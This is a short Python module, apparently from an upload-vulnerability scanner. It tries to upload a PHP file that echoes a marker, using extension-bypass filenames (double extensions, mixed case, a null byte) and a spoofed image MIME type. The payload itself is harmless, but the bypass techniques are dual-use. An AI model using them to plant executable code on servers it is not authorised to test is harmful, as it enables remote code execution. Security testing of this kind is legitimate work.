PHP_PAYLOAD = b"<?php echo 'UPLOAD_HUNTER_RCE'; ?>"

EXTENSIONS = [
    ".php",
    ".php.jpg",
    ".php;.jpg",
    ".pHp",
    ".php%00.jpg"
]

def run(uploader):
    results = []

    for ext in EXTENSIONS:
        filename = "test" + ext
        print(f"[+] Testing upload: {filename}")

        result = uploader.upload(
            filename=filename,
            content=PHP_PAYLOAD,
            mime="image/jpeg"
        )

        results.append(result)

    return results
